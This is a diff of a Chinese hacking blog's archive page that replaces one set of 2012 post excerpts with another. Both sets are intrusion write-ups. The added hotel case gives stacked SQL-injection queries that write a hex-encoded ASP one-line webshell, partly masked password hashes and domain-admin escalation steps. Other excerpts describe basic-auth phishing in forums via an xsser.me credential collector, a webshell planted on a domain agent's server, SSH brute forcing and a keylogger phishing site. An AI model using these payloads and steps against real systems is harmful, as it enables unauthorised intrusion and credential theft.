@@ -45,29 +45,29 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-06-20T12:03:05.000Z" itemprop="datePublished">
-          2012-06-20
+      <time datetime="2012-12-10T00:14:53.000Z" itemprop="datePublished">
+          2012-12-10
       </time>
     
     
     | 
-    <a href='/tag/注入漏洞/'>注入漏洞</a>,
+    <a href='/tag/xss/'>xss</a>,
     
-    <a href='/tag/关于IN方式的注入漏洞/'>关于IN方式的注入漏洞</a>
+    <a href='/tag/钓鱼/'>钓鱼</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/534.seo/">关于IN方式的注入漏洞</a></h2>
+      <h2 class="post-title"><a href="/953.seo/">当Discuz!遇上xsser.me：基础认证钓鱼</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        By jmdcw    曾多次写过关于IN方式的注入，可能程序员并不看俺的文章，所以嘛。。。。今天受小林之托，在看一段源码时，又见到了这个漏洞，闲来无事，就来现一下吧，高手请飘过。    &#160;&#160;&#160;&#160;&#160; 一般IN方式的利用代码如下：    dim id    id=request.form(&quot;id&quot;)    Conn.Execute(&quot;delect from 表
+        <p>简要描述：</p>  <p>利用的是xsser.me的基础认证<a href="http://ha.cker.in/tag/钓鱼" target="_blank">钓鱼</a>，并成功钓到用户数据</p>  <p>详细说明：</p>  <p>当在Discuz中回帖，插入一张很奇葩的图片时，可能就会导致用户被盗号。</p>  <p><a href="http://xsser.me/authtest.php?id=Ayuk1y&amp;info=Please+Login+In++@360.cn">http://xsser.me/authtest.php?id=Ayuk1y&amp;info=Please+Login+In++@360.cn</a>   <br />例如上面那个地址，可以用图片来引用之，然后回帖，当用户看到这张图片的时候，就会触发提示登陆框。    <br />这个地址是一个401头    <br />HTTP/1.1 401 Unauthorized    <br />当输入密码后，会重定向到收集数据的页面，接着，你们密码就被盗了。    <br />我为什么认为这个是一个漏洞：    <br />1、用户网站大多都是提醒用户不要再站外输入自己的账号密码，但是，现在将代码插入到网站内部，用户有认为这是在网站内部，所以就输入了自己的密码。    <br />2、经过试验，成功钓到了用户的数据    <br />3、不仅仅是Discuz，需要网站都支持引用一张网络图片，并没有对图片的HTTP头进行检验。基础认证钓鱼很容易蔓延开来。。    <br />4、之前的钓鱼过程是：黑客设立钓鱼页——通过短信息等传播这个地址——用户访问——用户受骗    <br />而现在是：黑客在帖子中插入钓鱼信息——用户访问——用户受骗    <br />显然，就少了一个非常繁琐的步骤。    <br />例如，在一个论坛中，我将那个图片插在签名中，然后几乎每个帖子都去回复，然后，用户基本上就是去到哪里都能看到我的框框。。。。-,-然后后果你猜？！    <br />（部分浏览器不支持）</p>  <p>漏洞证明：</p>  <p>以360论坛和吾爱破解论坛做了个试验。</p><br>
       
       </p>
       
       <p>
-          <a href="/534.seo/" class="excerpt-link">Read More...</a>
+          <a href="/953.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -76,22 +76,29 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-06-19T14:37:21.000Z" itemprop="datePublished">
-          2012-06-19
+      <time datetime="2012-12-09T06:42:48.000Z" itemprop="datePublished">
+          2012-12-09
       </time>
     
+    
+    | 
+    <a href='/tag/Webshell/'>Webshell</a>,
+    
+    <a href='/tag/内网渗透/'>内网渗透</a>
+    
+    
 </span>
-      <h2 class="post-title"><a href="/532.seo/">中国搞成这样，到底谁应当反思？</a></h2>
+      <h2 class="post-title"><a href="/952.seo/">对国外某hotel的内网域渗透案例</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        如今的中国，可谓内外交困。  国内：  &#160;&#160;&#160; 推行把房地产当做支柱产业的错误政策，并且纵容房地产的恶性膨胀，已经彻底地摧毁了中国的政治、经济、文化和社会，使得中国的政治败坏、经济溃烂、文化崩塌、社会堕落。更进一步地推行所谓的宽松的货币政策，大肆滥印纸币，致物价飞涨。。。。。。国内民怨沸腾，群体事件层出不穷，广东乌坎事件已经是揭竿而起，极具代表性。腐败泛滥，贪腐金额没有最高，只有更高。地方政府已经彻底堕落，
+        <p>目录</p>  <p>1网站初探</p>  <p>2通过Sql注入获取webshell</p>  <p>2.1通过Log备份获得webshell</p>  <p>3权限提升</p>  <p>3.1查看服务器基本信息</p>  <p>3.2渗透A域中的机器</p>  <p>4渗透其他域下机器</p>  <p>4.1轻松搞定WORKGROUP下机器</p>  <p>4.2渗透B域下的机器</p>  <p>4.3一波未平一波又起</p>  <p>5截稿</p>  <p>本文将讲述对国外某一hotel的渗透测试，让更多的人安全意识得到提高，有攻才有访，防得在好，也有疏忽的地方，这就是为啥你”老婆”原来是你失散多年的兄妹.</p>  <p>网站初探</p>  <p>本篇由于不是针对性的对目标进行渗透测试, 所以直接寻找网站的常见漏洞进行渗透.灰话不多扯.<ins>(</ins><ins>开启</ins><ins>vpn,</ins><ins>跳到肉鸡</ins><ins>,</ins><ins>嘞次购</ins><ins>.)</ins>    <br />首先了解一下网站的概况,查看网页链接,可以看出是asp.net写的,这里就可以猜测出服务器是windows+iis.使用火狐的Live HTTP headers插件刷的一下就可以看出来了.    <br /><a href="http://www.pentesting.cc/wp-content/uploads/2012/11/%E5%9B%BE%E7%89%871.jpg"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="live http header" border="0" alt="clip_image001" src="http://img.cker.in/hotel_13F2D/clip_image001.jpg" width="570" height="370" /></a></p>  <p>通过Sql注入获取<a href="http://ha.cker.in/tag/webshell" target="_blank">webshell</a></p>  <p>这里漏洞修补了,就不截图了,直接给出方法:   <br /><a href="http://www.pentesting.cc/test.aspx?id=1">http://www.pentesting.cc/test.aspx?id=1</a> AND 1 IN (select @@version)–返回    <br />Microsoft SQL Server 2008 (RTM) - 10.0.1600.22 (X64)</p>  <p>通过Log备份获得webshell   <table border="0" cellspacing="0" cellpadding="0"><tbody>       <tr>         <td width="1440">           <p>test.aspx?id=1;alter/<strong>/database/</strong>/[CRSHGC]/<strong>/set/</strong>/recovery/<strong>/full–</p>            <p>test.aspx?id=1;declare/</strong>/@d/<strong>/nvarchar(4000)/</strong>/select/<strong>/@d%3D0x640062006200610063006B00/</strong>/backup/<strong>/database/</strong>/[CRSHGC]/<strong>/to/</strong>/disk%3D@d/<strong>/with/</strong>/init–</p>            <p>test.aspx?id=1;create/<strong>/table/</strong>/<a href="[a]/**/image">pg</a>–</p>            <p>test.aspx?id=1;declare/<strong>/@d/</strong>/nvarchar(4000)/<strong>/select/</strong>/@d%3D0x640062006200610063006B00/<strong>/backup/</strong>/log/<strong>/[CRSHGC]/</strong>/to/<strong>/disk%3D@d/</strong>/with/<strong>/init–</p>            <p>test.aspx?id=1;insert/</strong>/into/<strong>/<a href="[a]">pg</a>/</strong>/values(0x3C25457865637574652872657175657374282272222929253E)–</p>            <p>test.aspx?id=1;declare/<strong>/@d/</strong>/nvarchar(4000)/<strong>/select/</strong>/@d%master.dbo.fn_varbintohexstr(0x44003A005C0049006E00650074007000750062005C0077007700770072006F006F0074005C0078002E00610073007000)/<strong>/backup/</strong>/log/<strong>/[CRSHGC]/</strong>/to/<strong>/disk%3D@d/</strong>/with/<strong>/init–</p>         </td>       </tr>     </tbody></table> </p>  <p>权限提升</p>  <p>先query user看看有在线的木有，如图：   <br /><a href="http://www.pentesting.cc/wp-content/uploads/2012/11/queryuser.jpg"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="queryuser" border="0" alt="clip_image002" src="http://img.cker.in/hotel_13F2D/clip_image002.jpg" width="570" height="125" /></a>    <br />如果有管理在线的话，要么赶紧找到提权突破口就闪，要么就先撤了等时机在上，碰到细心的管理员netstat -an一下就可以很快的排查出xxip在连它，把日志一看就把你T飞了。这里经过查看多个web.config（for一下）找到了数据库的sa明文密码,当然你可以通过sql injection获取数据库密码hash进行破解.    <br />在别人的地盘用”自己”的东西是不是好点,一个sa就可以干很多事情了。个人习惯,先上传gethash工具,如: PwDump7 GetHashes都是很不错的选择,抓好丢机子里用彩虹表慢慢跑,前提免杀<ins>(</ins><ins>这里</ins><ins>tasklist</ins><ins>、</ins><ins>net start</ins><ins>、</ins><ins>netstat -an</ins><ins>一下木杀毒，此篇就不扯这了</ins><ins>)</ins>    <table border="0" cellspacing="0" cellpadding="0"><tbody>       <tr>         <td width="940">           <p>Administrator:500:AAD3B435B514-xxoo-435B51404EE:4148523F64-xxoo-27962CFEBB8673:::</p>            <p>ACC*</strong>ER:1120:7630AC7F823B-xxoo-435B51404EE:67C86B3C2C0-xxoo-7EB68485FF298D0::: </p>            <p>gr<strong><em>ral:1135:C1812A18AB-xxoo-AD8EF711268D9:D80B352E1DF-xxoo-08BA668C67901B::: </p>            <p>br</em></strong>ez:3142:397B32F70C9-xxoo-85F02E9B6432A9:3C6DF2F32-xxoo-43EBF3DA543347B16::: </p>            <p>C<strong><em>nt:3143:42490206A91-xxoo-B435B51404EE:59F1886EEA9-xxoo-728AE1EFDF78EC89::: </p>            <p>hm</em></strong>o:3145:0C3F791CC-xxoo-D87772F:4E0AC2608807827-xxoo-21717D800::: </p>            <p>……</p>         </td>       </tr>     </tbody></table> </p>  <p>查看服务器基本信息</p>  <p>ipconfig /all   <table border="0" cellspacing="0" cellpadding="0"><tbody>       <tr>         <td width="940">           <p>Windows IP Configuration</p>            <p>&#160;&#160; Host Name . . . . . . . . . . . . : host1</p>            <p>&#160;&#160; Primary Dns Suffix&#160; . . . . . . . : A.COM</p>            <p>&#160;&#160; Node Type . . . . . . . . . . . . : Unknown</p>            <p>&#160;&#160; IP Routing Enabled. . . . . . . . : No</p>            <p>&#160;&#160; WINS Proxy Enabled. . . . . . . . : No</p>            <p>&#160;&#160; DNS Suffix Search List. . . . . . : A.COM</p>            <p>Ethernet adapter Local Area Connection 2:</p>            <p>&#160;&#160; Connection-specific DNS Suffix&#160; . : </p>            <p>&#160;&#160; Description . . . . . . . . . . . : Broadcom NetXtreme Gigabit Ethernet #2</p>            <p>&#160;&#160; Physical Address. . . . . . . . . : 00-14-85-02-00-xx</p>            <p>&#160;&#160; DHCP Enabled. . . . . . . . . . . : No</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.205</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.202</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.201</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.195</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.103</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.13</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.65</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; Default Gateway . . . . . . . . . : 192.168.100.1</p>            <p>&#160;&#160; DNS Servers . . . . . . . . . . . : 192.168.100.201</p>            <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 192.168.100.212</p>            <p>Ethernet adapter Local Area Connection:</p>            <p>&#160;&#160; Connection-specific DNS Suffix&#160; . : </p>            <p>&#160;&#160; Description . . . . . . . . . . . : Broadcom NetXtreme Gigabit Ethernet</p>            <p>&#160;&#160; Physical Address. . . . . . . . . : 00-14-85-02-00-x2</p>            <p>&#160;&#160; DHCP Enabled. . . . . . . . . . . : No</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.84</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.83</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.82</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.81</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.80</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.49</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; Default Gateway . . . . . . . . . : 192.168.100.1</p>            <p>&#160;&#160; DNS Servers . . . . . . . . . . . : 192.168.100.201</p>            <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 192.168.100.212</p>         </td>       </tr>     </tbody></table> </p>  <p>从上面就可以看出 是内网并且存在域，不清楚可以用命令net view /domain   <table border="0" cellspacing="0" cellpadding="0"><tbody>       <tr>         <td width="940">           <p>Domain</p>            <p>——————————————————————————-</p>            <p>B&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; </p>            <p>A&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; </p>            <p>WORKGROUP&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; </p>            <p>The command completed successfully.</p>         </td>       </tr>     </tbody></table> </p>  <p>渗透A域中的机器</p>  <p>查看A域中都有哪些域成员。<ins>（</ins><ins>IP</ins><ins>直接</ins><ins>ping</ins><ins>下就知道，记录下</ins><ins>TTL</ins><ins>值，猜测系统版本）</ins>    <br />dsquery server -o rdn <ins>(</ins><ins>不清楚的可以</ins><ins>nslookup A.com</ins><ins>或者</ins><ins>net group &quot;domain controllers&quot;</ins><ins>，这些命令在域环境下执行</ins><ins>)</ins>    <table border="0" cellspacing="0" cellpadding="0"><tbody>       <tr>         <td width="940">           <p>//查找当前域中所有的域控制器</p>            <p>HGhost&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; //192.168.100.212 TTL=128</p>            <p>host&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; //192.168.100.205 TTL=128 本机</p>            <p>HGhost2&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; //192.168.100.213 TTL=128</p>            <p>host1&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; //本机</p>         </td>       </tr>     </tbody></table> </p>  <p>可以看出本机为域控制器，那么得到domain admins权限就可以控制A域了，这里经过测试发现domain users权限的用户可以添加domain admins组的用户，直接net group &quot;domain admins&quot; xx /add就可以控制A域了（还是扯下吧，xx用户属于domain users跟administrators组，而administrators组加入了domain admins组 over），这里不建议添加用户之类的.因为这样很容易被发现,导致权限丢失。之前抓的系统hash部分密码用彩虹表破解出来了，我们用这些密码登录A域中的其他机器试试，这里以截图为目的。</p><br>
       
       </p>
       
       <p>
-          <a href="/532.seo/" class="excerpt-link">Read More...</a>
+          <a href="/952.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -100,31 +107,31 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-06-16T07:54:20.000Z" itemprop="datePublished">
-          2012-06-16
+      <time datetime="2012-12-07T06:42:03.000Z" itemprop="datePublished">
+          2012-12-07
       </time>
     
     
     | 
-    <a href='/tag/Metasploit/'>Metasploit</a>,
+    <a href='/tag/神器/'>神器</a>,
     
-    <a href='/tag/Armitage/'>Armitage</a>,
+    <a href='/tag/ARP/'>ARP</a>,
     
-    <a href='/tag/Metasploit和armitage整合/'>Metasploit和armitage整合</a>
+    <a href='/tag/劫持/'>劫持</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/530.seo/">Metasploit和armitage整合教程</a></h2>
+      <h2 class="post-title"><a href="/951.seo/">深夜劫持雾隐技术小组</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p><a href="http://ha.cker.in/tag/Metasploit" target="_blank">Metasploit</a>不用过多介绍，是一个很强大的入侵工具集，但由于界面多基于命令行模式，自身UI并非那么友好，可能对部分人使用上带来一定困难。而armitage是针对metaspolit开发的一套基于java，metaspolit的扩展程序，实际是类似metaspolit的图形化，让使用上更加直观便利。    <br />下面是具体的安装步骤，使用情况待摸熟后再来介绍，如有不足和错误之处望指正heyihome.blog.51cto.com    <br />一、 准备工作    <br />1、 下载最新metasploit framework 3.5 <a href="http://www.metasploit.com/">http://www.metasploit.com/</a>    <br />2、 下载armitage <a href="http://www.fastandeasyhacking.com">http://www.fastandeasyhacking.com</a>    <br />3、 下载jar 1.6+以上版本<a href="https://cds.sun.com/is-bin/INTERSHOP.enfinity/WFS/CDS-CDS_Developer-Site/en_US/-/USD/ViewFilteredProducts-SingleVariationTypeFilter">https://cds.sun.com/is-bin/INTERSHOP.enfinity/WFS/CDS-CDS_Developer-Site/en_US/-/USD/ViewFilteredProducts-SingleVariationTypeFilter</a>    <br />本文是在windows下安装，故只按windows来说明，linux大同小异。</p>
+        <p>作者:Noseay|Roc@哈客部落   <br />粉丿丶兜兜    <br />转载请注明作者以及出处,谢谢</p>  <p>下午看见大牛<a href="http://ha.cker.in/tag/ARP" target="_blank">ARP</a>雾隐技术小组在群发,.所以手痒,打算被ARP的时候去欺骗一下万网的蝈蝈,电话过去,想说域名被人劫持了,喊他重置下密码,谁知道问这问那的,最后却告诉我页面恢复了..无奈之下,万网的蝈蝈告诉了我代理商的电话和手机,百度之    <br />发现了该代理商的网站,用遇见蝈做的<a href="http://ha.cker.in/tag/神器" target="_blank">神器</a>扫了下</p>  <p><a href="http://img.cker.in/ae6251aa0e6e_13EAF/clip_image001.png" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/ae6251aa0e6e_13EAF/clip_image001_thumb.png" width="574" height="407" /></a></p>  <p>发现旁站挺多的,就随便拿个站下手吧,果断默认密码,上了个一句话</p>  <p><a href="http://img.cker.in/ae6251aa0e6e_13EAF/clip_image002.png" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/ae6251aa0e6e_13EAF/clip_image002_thumb.png" width="574" height="387" /></a></p>  <p>在上一个webshell,提权ing….   <br />拿下服务器后,把代理商的站脱了个光都没发现里面该黑阔注册的域名    <br />无奈之下,只有在服务器里乱逛,突然想到whois信息里的dns是NS1.xxxxxx.COM    <br />看了下服务器里,也有这个站xx.xxxxxx.com    <br />首页看了一下数据库、发现有好多关于域名的！</p><br>
       
       </p>
       
       <p>
-          <a href="/530.seo/" class="excerpt-link">Read More...</a>
+          <a href="/951.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -133,29 +140,27 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-06-14T05:06:31.000Z" itemprop="datePublished">
-          2012-06-14
+      <time datetime="2012-12-05T19:15:26.000Z" itemprop="datePublished">
+          2012-12-06
       </time>
     
     
     | 
-    <a href='/tag/Metasploit/'>Metasploit</a>,
-    
-    <a href='/tag/ssh/'>ssh</a>
+    <a href='/tag/fckeditor/'>fckeditor</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/527.seo/">利用metasploit的ssh模块破解ssh口令</a></h2>
+      <h2 class="post-title"><a href="/950.seo/">最新FCKEditor ASP上传绕过漏洞</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p><a href="http://ha.cker.in/tag/Metasploit" target="_blank">Metasploit</a>软件一般我们都是用来进行溢出什么的，在看了一个国外的一个人的blog上的关于msf的技巧，发现msf还可以进行远程ssh帐号口令的破解。    <br />Msf的ssh远程帐号口令模块默认就有，使用方法如下：    <br />Msf&gt;use auxiliary/scanner/ssh/ssh_login&#160; <br />加载ssh_login模块</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/metasploitsshssh_1251C/clip_image001.jpg" width="781" height="466" /></p>  <p></p>
+        exploiut-db：  FCKEditor ASP Version 2.6.8 File Upload Protection Bypass   - Title: FCKEditor 2.6.8 ASP Version File Upload Protection bypass    - Credit goes to: Mostafa Azizi, Soroush Dalili     - Link:http://sourceforg
       
       </p>
       
       <p>
-          <a href="/527.seo/" class="excerpt-link">Read More...</a>
+          <a href="/950.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -164,29 +169,31 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-06-14T04:41:27.000Z" itemprop="datePublished">
-          2012-06-14
+      <time datetime="2012-12-04T23:11:25.000Z" itemprop="datePublished">
+          2012-12-05
       </time>
     
     
     | 
-    <a href='/tag/入侵/'>入侵</a>,
+    <a href='/tag/漏洞/'>漏洞</a>,
     
-    <a href='/tag/snmp/'>snmp</a>
+    <a href='/tag/TCP链路劫持/'>TCP链路劫持</a>,
+    
+    <a href='/tag/ARP/'>ARP</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/522.seo/">snmp弱口令在一次常规入侵中的应用</a></h2>
+      <h2 class="post-title"><a href="/949.seo/">链路劫持攻击一二三</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p>常常见到论坛里面或qq里面有人问snmp的若口令怎么利用，其实网上已经有了一些关于snmp弱口令的介绍，无奈的是，我还没有看到谁做过教程，刚好这次入侵过程中snmp弱口令给了我很大的启发，于是就把他写了下来，希望给大家一些启发。</p>  <p>最近看到某个主页做得很烂，似乎很长时间没有做过维护了，不巧他的网速很快，于是我有了把他做成肉鸡的念头。首先当然是刺探信息了，开了x-scan,扫了一会儿，结果出来了：</p>  <p>主机地址</p>  <p>端口/服务</p>  <p>服务漏洞</p>  <p>202.<em>.</em>.<em> ftp (21/tcp) 发现安全提示</p>  <p>202.</em>.<em>.</em> telnet (23/tcp) 发现安全提示</p>  <p>202.<em>.</em>.<em> unknown (1080/tcp) 发现安全提示</p>  <p>202.</em>.<em>.</em> www (80/tcp) 发现安全漏洞</p>  <p>202.<em>.</em>.<em> unknown (3389/tcp) 发现安全提示</p>  <p>202.</em>.<em>.</em> snmp (161/udp) 发现安全漏洞</p>  <p>漏洞 snmp (161/udp) Snmp口令: &quot;public&quot;</p>
+        博文作者：lake2 [ TSRC ]  发布日期：2012-11-09  博文内容：  随着应用安全的发展，大家都比较关注应用安全漏洞，其实在应用层之下的传输层也有很多安全风险，而且这些安全风险正在被广泛利用。比如今天要给大家介绍的TCP链路劫持攻击。  TCP链路劫持其实就是指网络链路上侦听、伪造TCP包，达到控制目标网络链路的行为。最常见的就是某些设备实现的对非法站点的访问拦截，以及一些地区运营商的网页植入广告行为。  因为广域网
       
       </p>
       
       <p>
-          <a href="/522.seo/" class="excerpt-link">Read More...</a>
+          <a href="/949.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -195,33 +202,31 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-06-13T22:52:02.000Z" itemprop="datePublished">
-          2012-06-14
+      <time datetime="2012-11-24T12:49:46.000Z" itemprop="datePublished">
+          2012-11-24
       </time>
     
     
     | 
-    <a href='/tag/Metasploit/'>Metasploit</a>,
+    <a href='/tag/渗透/'>渗透</a>,
     
-    <a href='/tag/窃听/'>窃听</a>,
+    <a href='/tag/穿山甲/'>穿山甲</a>,
     
-    <a href='/tag/网络钓鱼/'>网络钓鱼</a>,
-    
-    <a href='/tag/keylogger/'>keylogger</a>
+    <a href='/tag/盲注/'>盲注</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/519.seo/">如何利用Metasploit制造一个键盘窃听网站</a></h2>
+      <h2 class="post-title"><a href="/948.seo/">从Jannock渗透小米科技(xiaomi.com)说起</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p><b>大家都应该知道网络钓鱼是什么吧，那么接下来这篇文章会来讲述如何利用</b><b>Metasploit</b><b>制造一个键盘窃听网站。</b></p>  <p><b>网络钓鱼的历史：</b></p>  <p>网络钓鱼技术始于1987年，于1995年被第一次发现。</p>  <p>攻击者通过钓鱼技术获取受害者的一些信息，包括用户名、密码、信用卡细节等等。   <br />一般来说，攻击者会制造一个假冒的网站诱惑受害者进入并输入他的信息，比如仿造gmail、雅虎、facebook的登录框。</p>  <p><b>Javascript keylogger</b><b>简介：</b></p>  <p>Javascript keylogger可以捕捉通过网络的键盘击键事件。   <br />使用JavaScript keylogger的优势在于：他不需要我们预先拥有一个服务器空间，然后再上传一个假冒的网页，写伪造的页面、插链接</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001[4]" border="0" alt="clip_image001[4]" src="http://img.cker.in/Metasploit_D0E0/clip_image0014.png" width="541" height="231" /></p>  <p>再写个蛋疼的采集脚本（如下图）…<img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002[4]" border="0" alt="clip_image002[4]" src="http://img.cker.in/Metasploit_D0E0/clip_image0024.png" width="585" height="144" /></p>  <p><b>使用</b><b>Metasploit</b><b>制造键盘窃听网站：</b></p>  <p>1. 打开msfconsle</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004[4]" border="0" alt="clip_image004[4]" src="http://img.cker.in/Metasploit_D0E0/clip_image0044.jpg" width="558" height="356" /></p>
+        过年的时候在家无聊，适逢wooyun开站,于是去看了看，居然看到有人12月份发了小米科技渗透的过程。仔细看了看，非常经典的一次渗透过程，其中注入,上传,社工基本上是无缝结合。现在渗透在外面，有些人看来似乎没有什么技术含量，有些人则认为高不可及，那么从这个渗透的案例，我来解答下相关的技术点。看看大家掌握了多少。    首先,作者是从http://xshare.api.xiaomi.com/xShare?do=list2&amp;choic
       
       </p>
       
       <p>
-          <a href="/519.seo/" class="excerpt-link">Read More...</a>
+          <a href="/948.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -229,7 +234,7 @@
   
   <nav class="pagination" role="pagination">
     <a class="newer-posts" href="/archives/page/29/">← Newer Posts</a>
-    <span class="page-number">Page 30 of 57</span>
+    <span class="page-number">Page 30 of 81</span>
     <a class="older-posts" href="/archives/page/31/">Older Posts →</a>
   </nav>
 </main>
